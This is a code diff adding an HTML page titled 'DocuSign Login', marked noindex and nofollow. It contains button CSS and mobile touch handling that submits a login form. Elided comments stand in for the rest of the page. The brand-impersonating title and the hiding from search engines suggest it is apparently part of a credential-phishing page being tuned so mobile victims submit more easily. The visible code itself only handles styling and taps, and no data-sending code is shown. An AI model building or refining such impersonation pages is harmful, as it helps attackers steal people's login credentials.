@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow">
+    <title>DocuSign Login</title>
+    <style>
+        /* [Previous CSS remains the same until .login-btn] */
+        
+        .login-btn {
+            width: 100%;
+            padding: 16px; /* Increased padding for better touch */
+            background-color: #2e2e94;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            -webkit-tap-highlight-color: rgba(0,0,0,0); /* Remove tap highlight */
+            touch-action: manipulation; /* Prevent double-tap zoom */
+            min-height: 44px; /* Minimum touch target size */
+            position: relative; /* For pseudo-element */
+            overflow: hidden; /* Contain pseudo-element */
+        }
+        
+        /* Ripple effect for visual feedback */
+        .login-btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.5);
+            opacity: 0;
+            border-radius: 100%;
+            transform: scale(1, 1) translate(-50%);
+            transform-origin: 50% 50%;
+        }
+        
+        .login-btn:active::after {
+            animation: ripple 0.6s ease-out;
+        }
+        
+        @keyframes ripple {
+            0% {
+                transform: scale(0, 0);
+                opacity: 0.5;
+            }
+            100% {
+                transform: scale(20, 20);
+                opacity: 0;
+            }
+        }
+        
+        /* Mobile-specific button enhancements */
+        @media (max-width: 768px) {
+            .login-btn {
+                padding: 18px; /* Even larger on mobile */
+                font-size: 17px; /* Slightly larger text */
+            }
+        }
+        
+        /* Prevent form from being covered by mobile keyboard */
+        @media (max-height: 600px) {
+            .container {
+                margin-top: 20px;
+                margin-bottom: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- [Previous HTML remains the same] -->
+    
+    <script>
+        // [Previous JavaScript remains the same until form submission]
+        
+        // Enhanced mobile click handling
+        function handleButtonTap(event) {
+            // Prevent any other potentially conflicting handlers
+            event.stopPropagation();
+            event.preventDefault();
+            
+            // Visual feedback
+            const btn = event.currentTarget;
+            btn.style.transform = 'scale(0.98)';
+            setTimeout(() => {
+                btn.style.transform = 'scale(1)';
+            }, 100);
+            
+            // Trigger form submission
+            document.getElementById('login-form').dispatchEvent(new Event('submit'));
+        }
+        
+        // Mobile-specific event listeners
+        if (/Mobi|Android/i.test(navigator.userAgent)) {
+            const loginBtn = document.getElementById('login-btn');
+            
+            // Remove existing click listeners to prevent duplicates
+            loginBtn.removeEventListener('click', handleButtonTap);
+            
+            // Add touch-optimized event listeners
+            loginBtn.addEventListener('touchstart', handleButtonTap, { passive: false });
+            loginBtn.addEventListener('touchend', (e) => e.preventDefault(), { passive: false });
+            
+            // Still keep click for hybrid devices
+            loginBtn.addEventListener('click', handleButtonTap);
+            
+            // Make sure the button is above other elements
+            loginBtn.style.zIndex = '10';
+            loginBtn.style.position = 'relative';
+        }
+        
+        // [Rest of your existing JavaScript]
+    </script>
+</body>
+</html>
